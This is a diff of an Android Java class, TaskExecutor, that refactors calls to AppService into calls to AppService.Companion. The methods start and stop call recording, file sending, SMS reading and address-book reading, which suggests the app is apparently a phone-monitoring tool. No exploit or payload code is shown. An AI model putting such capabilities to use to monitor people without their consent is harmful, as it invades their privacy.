@@ -20,43 +20,43 @@ class TaskExecutor implements ITaskExecutor{
     @Override
     public void startCallRecording()
     {
-        AppService.startTask(context, ITaskProvider.TASK_CALL_RECORDING);
+        AppService.Companion.startTask(context, ITaskProvider.TASK_CALL_RECORDING);
     }
     @Override
     public void stopCallRecording()
     {
-        AppService.stopTask(context, ITaskProvider.TASK_CALL_RECORDING);
+        AppService.Companion.stopTask(context, ITaskProvider.TASK_CALL_RECORDING);
     }
 
     @Override
     public void startFileSending()
     {
-        AppService.startTask(context, ITaskProvider.TASK_SEND_FILES);
+        AppService.Companion.startTask(context, ITaskProvider.TASK_SEND_FILES);
     }
     @Override
     public void stopFileSending()
     {
-        AppService.stopTask(context, ITaskProvider.TASK_SEND_FILES);
+        AppService.Companion.stopTask(context, ITaskProvider.TASK_SEND_FILES);
     }
 
     @Override
     public void startSMSreading()
     {
-        AppService.startTask(context, ITaskProvider.TASK_SMS_READING);
+        AppService.Companion.startTask(context, ITaskProvider.TASK_SMS_READING);
     }
     @Override
     public void stopSMSreading()
     {
-        AppService.stopTask(context, ITaskProvider.TASK_SMS_READING);
+        AppService.Companion.stopTask(context, ITaskProvider.TASK_SMS_READING);
     }
 
     @Override
     public void startAddrBookReading()
     {
-        AppService.startTask(context, ITaskProvider.TASK_ADDRBOOK_READING);
+        AppService.Companion.startTask(context, ITaskProvider.TASK_ADDRBOOK_READING);
     };
     @Override
     public void stopAddrBookReading(){
-        AppService.stopTask(context, ITaskProvider.TASK_ADDRBOOK_READING);
+        AppService.Companion.stopTask(context, ITaskProvider.TASK_ADDRBOOK_READING);
     }
 }
